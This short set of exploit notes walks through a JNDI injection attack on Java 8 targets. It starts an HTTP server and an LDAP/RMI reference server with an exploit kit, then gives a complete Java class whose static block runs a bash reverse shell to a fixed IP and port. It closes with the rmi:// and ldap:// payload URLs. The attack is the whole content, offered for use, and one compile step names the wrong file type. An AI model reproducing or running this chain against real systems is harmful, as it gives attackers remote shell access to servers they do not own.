
Run `python3 -m http.server 8010`

Use JDNI-Exploit-Kit to start the LDAP ref server

Then create ExecTemplateJDK8.java:

```java
import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;

public class ExecTemplateJDK8
{
    static {
        System.out.println("hello world ls -lah");
        try {
            String[] cmd = {"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.0.89/4242 0>&1"};
            Process p = Runtime.getRuntime().exec(cmd);
            p.waitFor();
            try (BufferedReader bf = new BufferedReader(new InputStreamReader(p.getInputStream()))) {
                String line;
                while ((line = bf.readLine()) != null) {
                    System.out.println(line);
                }
            }
        } catch (Exception exception) {
            exception.printStackTrace();
        }
    }
}
```

Compile with javac ExecTemplateJDK8.class

Use this one:

```
Target environment(Build in JDK 1.8 whose trustURLCodebase is true):
rmi://192.168.0.89:1099/nsxlbk
ldap://192.168.0.89:1389/nsxlbk
```
